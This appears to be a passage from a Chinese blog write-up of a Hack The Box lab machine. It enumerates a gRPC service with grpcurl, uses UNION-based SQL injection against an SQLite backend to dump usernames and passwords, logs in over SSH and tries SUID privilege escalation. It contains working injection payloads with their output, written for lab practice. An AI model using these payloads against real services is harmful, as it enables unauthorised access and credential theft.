<p>22&#x2F;tcp    open  ssh<br>50051&#x2F;tcp open  unknown</p>
</blockquote>
<h3 id="2-未知端口50051"><a href="#2-未知端口50051" class="headerlink" title="2.未知端口50051"></a>2.未知端口50051</h3><p>搜索引擎搜一下，说是grpc的默认端口为50051</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230623140547228.png"></p>
<blockquote>
<p>Google远程过程调用（Google Remote Procedure Call，gRPC）是基于HTTP 2.0传输层协议承载的高性能开源RPC软件框架，为管理和配置网络设备提供了一种API接口设计的方法。gRPC提供了多种编程语言，如C、Java、golong、python等。<br>gRPC可以作为数据传输协议与Telemetry技术配合使用，可实时、高速、精确的监控网络设备的运行状态。此外，网络设备提供了一种基于gRPC方式来管理设备的方法，包括配置、查询和能力获取三种方法。这些方法是通过设备和采集器对接，实现采集设备数据的功能。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/fullstorydev/grpcui">https://github.com/fullstorydev/grpcui</a></p>
<p>下载链接工具。 但是要go环境。</p>
<h4 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h4><p>那就找docker的</p>
<p><code>docker pull fullstorydev/grpcurl:latest</code></p>
<p>启动</p>
<p><code>docker run fullstorydev/grpcurl -plaintext 10.10.11.214:50051  </code>  </p>
<p>少了参数。</p>
<p>-help</p>
<p>然后出现以下帮助</p>
<blockquote>
<p>Usage:<br>        &#x2F;bin&#x2F;grpcurl [flags] [address] [list|describe] [symbol]</p>
<p>The ‘address’ is only optional when used with ‘list’ or ‘describe’ and a<br>protoset or proto flag is provided.</p>
<p>If ‘list’ is indicated, the symbol (if present) should be a fully-qualified<br>service name. If present, all methods of that service are listed. If not<br>present, all exposed services are listed, or all services defined in protosets.</p>
<p>If ‘describe’ is indicated, the descriptor for the given symbol is shown. The<br>symbol should be a fully-qualified service, enum, or message name. If no symbol<br>is given then the descriptors for all exposed or known services are shown.</p>
<p>If neither verb is present, the symbol must be a fully-qualified method name in<br>‘service&#x2F;method’ or ‘service.method’ format. In this case, the request body will<br>be used to invoke the named method. If no body is given but one is required<br>(i.e. the method is unary or server-streaming), an empty instance of the<br>method’s request type will be sent.</p>
<p>The address will typically be in the form “host:port” where host can be an IP<br>address or a hostname and port is a numeric port or service name. If an IPv6<br>address is given, it must be surrounded by brackets, like “[2001:db8::1]”. For<br>Unix variants, if a -unix&#x3D;true flag is present, then the address must be the<br>path to the domain socket.</p>
<p>Available flags:<br>  -H value<br>        Additional headers in ‘name: value’ format. May specify more than one<br>        via multiple flags. These headers will also be included in reflection<br>        requests to a server.<br>  -allow-unknown-fields<br>        When true, the request contents, if ‘json’ format is used, allows<br>        unknown fields to be present. They will be ignored when parsing<br>        the request.<br>  -authority string<br>        The authoritative name of the remote server. This value is passed as the<br>        value of the “:authority” pseudo-header in the HTTP&#x2F;2 protocol. When TLS<br>        is used, this will also be used as the server name when verifying the<br>        server’s certificate. It defaults to the address that is provided in the<br>        positional arguments.<br>  -cacert string<br>        File containing trusted root certificates for verifying the server.<br>        Ignored if -insecure is specified.<br>  -cert string<br>        File containing client certificate (public key), to present to the<br>        server. Not valid with -plaintext option. Must also provide -key option.<br>  -connect-timeout float<br>        The maximum time, in seconds, to wait for connection to be established.<br>        Defaults to 10 seconds.<br>  -d string<br>        Data for request contents. If the value is ‘@’ then the request contents<br>        are read from stdin. For calls that accept a stream of requests, the<br>        contents should include all such request messages concatenated together<br>        (possibly delimited; see -format).<br>  -emit-defaults<br>        Emit default values for JSON-encoded responses.<br>  -expand-headers<br>        If set, headers may use ‘${NAME}’ syntax to reference environment<br>        variables. These will be expanded to the actual environment variable<br>        value before sending to the server. For example, if there is an<br>        environment variable defined like FOO&#x3D;bar, then a header of<br>        ‘key: ${FOO}’ would expand to ‘key: bar’. This applies to -H,<br>        -rpc-header, and -reflect-header options. No other expansion&#x2F;escaping is<br>        performed. This can be used to supply credentials&#x2F;secrets without having<br>        to put them in command-line arguments.<br>  -format string<br>        The format of request data. The allowed values are ‘json’ or ‘text’. For<br>        ‘json’, the input data must be in JSON format. Multiple request values<br>        may be concatenated (messages with a JSON representation other than<br>        object must be separated by whitespace, such as a newline). For ‘text’,<br>        the input data must be in the protobuf text format, in which case<br>        multiple request values must be separated by the “record separator”<br>        ASCII character: 0x1E. The stream should not end in a record separator.<br>        If it does, it will be interpreted as a final, blank message after the<br>        separator. (default “json”)<br>  -format-error<br>        When a non-zero status is returned, format the response using the<br>        value set by the -format flag .<br>  -help<br>        Print usage instructions and exit.<br>  -import-path value<br>        The path to a directory from which proto sources can be imported, for<br>        use with -proto flags. Multiple import paths can be configured by<br>        specifying multiple -import-path flags. Paths will be searched in the<br>        order given. If no import paths are given, all files (including all<br>        imports) must be provided as -proto flags, and grpcurl will attempt to<br>        resolve all import statements from the set of file names given.<br>  -insecure<br>        Skip server certificate and domain verification. (NOT SECURE!) Not<br>        valid with -plaintext option.<br>  -keepalive-time float<br>        If present, the maximum idle time in seconds, after which a keepalive<br>        probe is sent. If the connection remains idle and no keepalive response<br>        is received for this same period then the connection is closed and the<br>        operation fails.<br>  -key string<br>        File containing client private key, to present to the server. Not valid<br>        with -plaintext option. Must also provide -cert option.<br>  -max-msg-sz int<br>        The maximum encoded size of a response message, in bytes, that grpcurl<br>        will accept. If not specified, defaults to 4,194,304 (4 megabytes).<br>  -max-time float<br>        The maximum total time the operation can take, in seconds. This is<br>        useful for preventing batch jobs that use grpcurl from hanging due to<br>        slow or bad network links or due to incorrect stream method usage.<br>  -msg-template<br>        When describing messages, show a template of input data.<br>  -plaintext<br>        Use plain-text HTTP&#x2F;2 when connecting to server (no TLS).<br>  -proto value<br>        The name of a proto source file. Source files given will be used to<br>        determine the RPC schema instead of querying for it from the remote<br>        server via the gRPC reflection API. When set: the ‘list’ action lists<br>        the services found in the given files and their imports (vs. those<br>        exposed by the remote server), and the ‘describe’ action describes<br>        symbols found in the given files. May specify more than one via multiple<br>        -proto flags. Imports will be resolved using the given -import-path<br>        flags. Multiple proto files can be specified by specifying multiple<br>        -proto flags. It is an error to use both -protoset and -proto flags.<br>  -protoset value<br>        The name of a file containing an encoded FileDescriptorSet. This file’s<br>        contents will be used to determine the RPC schema instead of querying<br>        for it from the remote server via the gRPC reflection API. When set: the<br>        ‘list’ action lists the services found in the given descriptors (vs.<br>        those exposed by the remote server), and the ‘describe’ action describes<br>        symbols found in the given descriptors. May specify more than one via<br>        multiple -protoset flags. It is an error to use both -protoset and<br>        -proto flags.<br>  -protoset-out string<br>        The name of a file to be written that will contain a FileDescriptorSet<br>        proto. With the list and describe verbs, the listed or described<br>        elements and their transitive dependencies will be written to the named<br>        file if this option is given. When invoking an RPC and this option is<br>        given, the method being invoked and its transitive dependencies will be<br>        included in the output file.<br>  -reflect-header value<br>        Additional reflection headers in ‘name: value’ format. May specify more<br>        than one via multiple flags. These headers will <em>only</em> be used during<br>        reflection requests and will be excluded when invoking the requested RPC<br>        method.<br>  -rpc-header value<br>        Additional RPC headers in ‘name: value’ format. May specify more than<br>        one via multiple flags. These headers will <em>only</em> be used when invoking<br>        the requested RPC method. They are excluded from reflection requests.<br>  -servername string<br>        Override server name when validating TLS certificate. This flag is<br>        ignored if -plaintext or -insecure is used.<br>        NOTE: Prefer -authority. This flag may be removed in the future. It is<br>        an error to use both -authority and -servername (though this will be<br>        permitted if they are both set to the same value, to increase backwards<br>        compatibility with earlier releases that allowed both to be set).<br>  -unix<br>        Indicates that the server address is the path to a Unix domain socket.<br>  -use-reflection<br>        When true, server reflection will be used to determine the RPC schema.<br>        Defaults to true unless a -proto or -protoset option is provided. If<br>        -use-reflection is used in combination with a -proto or -protoset flag,<br>        the provided descriptor sources will be used in addition to server<br>        reflection to resolve messages and extensions.<br>  -user-agent string<br>        If set, the specified value will be added to the User-Agent header set<br>        by the grpc-go library.<br>  -v    Enable verbose output.<br>  -version<br>        Print version.<br>  -vv<br>        Enable very verbose output.</p>
</blockquote>
<p>&#x2F;&#x2F;list</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 list<br>SimpleApp<br>grpc.reflection.v1alpha.ServerReflection</p>
</blockquote>
<p>&#x2F;&#x2F;describe查看</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp<br>SimpleApp is a service:<br>service SimpleApp {<br>  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );<br>  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );<br>  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );<br>}</p>
</blockquote>
<p>&#x2F;&#x2F;查看注册请求方法</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserRequest<br>RegisterUserRequest is a message:<br>message RegisterUserRequest {<br>  string username &#x3D; 1;<br>  string password &#x3D; 2;<br>}</p>
</blockquote>
<p>&#x2F;&#x2F;注册一下</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“username”:”123”,”password”:”123”}’ 10.10.11.214:50051 SimpleApp.RegisterUser<br>{<br>  “message”: “username or password must be greater than 4”<br>}</p>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“username”:”1234”,”password”:”1234”}’ 10.10.11.214:50051 SimpleApp.RegisterUser<br>{<br>  “message”: “Account created for user 1234!”<br>}</p>
</blockquote>
<p>&#x2F;&#x2F;登录</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext  -v -d ‘{“username”:”1234”,”password”:”1234”}’ 10.10.11.214:50051 SimpleApp.LoginUser</p>
<p>&#x2F;&#x2F; -v是详细信息，后面有用的到的token</p>
<p>Resolved method descriptor:<br>rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );</p>
<p>Request metadata to send:<br>(empty)</p>
<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
<p>Response contents:<br>{<br>  “message”: “Your id is 842.”<br>}</p>
<p>Response trailers received:<br>token: b’eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM’<br>Sent 1 request and received 1 response</p>
</blockquote>
<p>&#x2F;&#x2F;getinfo</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“id”:”728”}’ 10.10.11.214:50051 SimpleApp.getInfo<br>{<br>  “message”: “Authorization Error.Missing ‘token’ header”<br>}</p>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”842”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo</p>
<p>Resolved method descriptor:<br>rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );</p>
<p>Request metadata to send:<br>token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM</p>
<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
<p>Response contents:<br>{<br>  “message”: “Will update soon.”<br>}</p>
<p>Response trailers received:<br>(empty)<br>Sent 1 request and received 1 response</p>
</blockquote>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”1’”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo<br>dquote&gt; </p>
</blockquote>
<p>好，使用了go环境跑grpcui的大佬，是通过bp抓包，sqlmap得到，数据库是sqlite，密码为HereIsYourPassWord1431，用户名sau。</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”1 union select 1”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo</p>
<p>Resolved method descriptor:<br>rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );</p>
<p>Request metadata to send:<br>token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM</p>
<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
<p>Response contents:<br>{<br>  “message”: “1”<br>}</p>
<p>Response trailers received:<br>(empty)<br>Sent 1 request and received 1 response</p>
</blockquote>
<p>百度了下sqlite的语法</p>
<blockquote>
<p>SELECT type, name, tbl_name, rootpage, sql FROM sqlite_master WHERE type&#x3D;’table’;</p>
</blockquote>
<p><code>docker run fullstorydev/grpcurl -plaintext -v -d &#39;&#123;&quot;id&quot;:&quot;1 union select sql from sqlite_master where type=\&quot;table\&quot;&quot;&#125;&#39; -H &quot;token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM&quot; 10.10.11.214:50051 SimpleApp.getInfo</code></p>
<blockquote>
<p>…</p>
<p>Response contents:<br>{<br>  “message”: “CREATE TABLE &quot;accounts&quot; (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)”<br>}</p>
</blockquote>
<p>有一个accounts表，字段为username和password</p>
<p><code>docker run fullstorydev/grpcurl -plaintext -v -d &#39;&#123;&quot;id&quot;:&quot;1 union select group_concat(username||\&quot;~\&quot;||password) from accounts&quot;&#125;&#39; -H &quot;token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM&quot; 10.10.11.214:50051 SimpleApp.getInfo</code></p>
<blockquote>
<p><code>||</code>符号通常用作字符串连接运算符，用于将两个字符串连接在一起。它在许多关系型数据库管理系统（包括SQLite）中都被广泛支持，跨数据库通用。用逗号这里貌似出错了。</p>
</blockquote>
<blockquote>
<p>Response contents:<br>{<br>  “message”: “admin<del>admin,sau</del>HereIsYourPassWord1431”<br>}</p>
</blockquote>
<h3 id="3-ssh连接-1"><a href="#3-ssh连接-1" class="headerlink" title="3.ssh连接"></a>3.ssh连接</h3><p> <code>ssh sau@10.10.11.214</code> </p>
<blockquote>
<p> cat user.txt</p>
</blockquote>
<h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h3><p>sudo -l提权</p>
<blockquote>
<p>sau@pc:~$ sudo -l<br>[sudo] password for sau:<br>Sorry, user sau may not run sudo on localhost.</p>
</blockquote>
<p>suid提权</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<blockquote>
<p>用于查找具有 SetUID 权限的可执行文件</p>
<ul>
<li><p><code>find</code>：这是一个用于在文件系统中搜索文件和目录的命令。</p>
</li>
<li><p><code>/</code>：表示搜索的起始位置为根目录。</p>
</li>
<li><p><code>-perm -u=s</code>：这是<code>find</code>命令的选项之一。<code>-perm</code>用于匹配文件的权限，<code>-u=s</code>表示匹配具有 SetUID 权限的文件。</p>
</li>
<li><p><code>-type f</code>：这是<code>find</code>命令的另一个选项，指定要搜索的文件类型为普通文件。</p>
</li>
<li><p><code>2&gt;/dev/null</code>：将标准错误输出重定向到 <code>/dev/null</code>，这样可以隐藏权限错误信息。</p>
<p>通常，SetUID 权限用于以文件所有者的权限而不是执行者的权限来执行文件。</p>
</li>
</ul>
</blockquote>
<p>发现了一个**&#x2F;usr&#x2F;bin&#x2F;bash**</p>
<p><code>/usr/bin/bash -p</code></p>
<p>按理说这样就可以是root身份了。</p>
<p>奇怪，我还是没反应，whoami不是root。</p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>搜索未知端口的服务入手。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/06/18/hack-the-box/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/" rel="tag">kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2023/06/25/%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            系统日志
          
        </div>
      </a>
    
    
      <a href="/2023/06/13/Web%E5%AE%89%E5%85%A8%E6%A0%B8%E5%BF%83%E9%97%AE%E9%A2%98/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">Web安全防护体系</div>
      </a>
    
  </nav>

  
   
  
   
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023
        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>

<script src="/js/clickBoom1.js"></script>
 
<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>